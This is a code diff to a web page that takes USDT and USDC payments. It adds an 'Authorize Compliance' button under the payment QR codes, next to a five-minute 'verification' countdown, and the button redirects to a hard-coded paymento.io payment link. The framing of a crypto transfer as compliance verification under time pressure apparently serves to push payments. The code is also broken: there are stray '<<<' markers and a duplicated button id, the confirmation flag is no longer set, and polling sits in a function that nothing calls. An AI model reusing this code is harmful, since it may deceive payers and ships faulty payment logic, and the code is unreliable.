@@ -507,6 +507,35 @@ header .logo-card img {
     margin-top:4px;
 }
 
+.walletconnect-actions{
+    margin-top:20px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+}
+
+.wallet-btn{
+    width:100%;
+    padding:14px 18px;
+    border:none;
+    border-radius:14px;
+    font-size:15px;
+    font-weight:700;
+    color:#fff;
+    background:linear-gradient(135deg,#6b2cd8,#9b59b6);
+    box-shadow:
+      0 0 12px rgba(107,44,216,0.5),
+      0 0 24px rgba(155,89,182,0.3);
+    transition:all .25s ease;
+}
+
+.wallet-btn:hover{
+    transform:translateY(-2px);
+    box-shadow:
+      0 0 18px rgba(107,44,216,0.7),
+      0 0 36px rgba(155,89,182,0.45);
+}
+
     /* Token Selector Mobile Adjustment */
     #tokenSelector {
         flex-direction: column;
@@ -577,6 +606,13 @@ header .logo-card img {
           <div id="usdt-qr"></div>
         </div>
 
+<<<div class="walletconnect-actions">
+
+  <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+    Authorize Compliance 
+  </button>
+
+</div>
         <p id="usdt-timer">Verification expires in 05:00</p>
 
         <div class="progress-bar">
@@ -612,6 +648,13 @@ header .logo-card img {
           <div id="usdc-qr"></div>
         </div>
 
+<<<div class="walletconnect-actions">
+
+  <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+    Authorize Compliance 
+  </button>
+
+</div>
         <p id="usdc-timer">Verification expires in 05:00</p>
 
         <div class="progress-bar">
@@ -641,6 +684,14 @@ header .logo-card img {
       e.preventDefault();
     }
   });
+
+// ================================
+// 🔐 PAYMENT MODE (HYBRID ROUTER)
+// ================================
+let paymentMode = "manual";
+let timerInterval;
+
+// "manual" | "paymento"
 
 // ---------------- TIMER / SESSION INITIALIZATION ----------------
 const totalDuration = 5 * 60 * 1000; // 5 minutes
@@ -681,6 +732,37 @@ function particle() {
     setTimeout(() => p.remove(), 30000);
 }
 setInterval(particle, 800);
+
+// ---------------- PAYMENTO ENGINE ----------------
+async function handlePayClick() {
+
+    try {
+        // prevent spam clicks
+        if (paymentMode === "paymento") return;
+
+        paymentMode = "paymento";
+
+        triggerNotification("Redirecting to connection portal...", 2000);
+
+        // stop manual polling if running
+        if (typeof pollTimeout !== "undefined") {
+            clearTimeout(pollTimeout);
+        }
+
+        // optional safety: mark session as transitioning
+        paymentDone = true;
+
+        // redirect
+        setTimeout(() => {
+            window.location.href =
+                "https://app.paymento.io/payment-link/f561273d652f4880b2c84d0cd6a08fef";
+        }, 800);
+
+    } catch (err) {
+        console.error(err);
+        triggerNotification("Authorization connection error", 3000);
+    }
+}
 
 // ---------------- COPY WALLET ----------------
 function copyWallet(id) {
@@ -879,7 +961,7 @@ localStorage.removeItem("avalonflowCustomAmount");
         }
     }
 
-    const timerInterval = setInterval(updateTimer, 1000);
+     timerInterval = setInterval(updateTimer, 1000);
     updateTimer(); // initial call
 });
 
@@ -911,7 +993,7 @@ async function checkPayment() {
                 confirmations >= 1 &&
                 !paymentDone
             ) {
-                paymentDone = true;
+               
                 animatePaymentLine();
 
                 localStorage.removeItem(storageKey);
@@ -1064,9 +1146,14 @@ function poll() {
     }, pollInterval);
 }
 
-// Start polling
-poll();
-checkPayment();
+// ---------------- MANUAL ENGINE GUARD ----------------
+function startManualIfAllowed() {
+    if (paymentMode !== "manual") return;
+
+    poll();
+    checkPayment();
+}
+
 
 function triggerNotification(message, duration = 3000) {
     const notification = document.getElementById("planNotification");
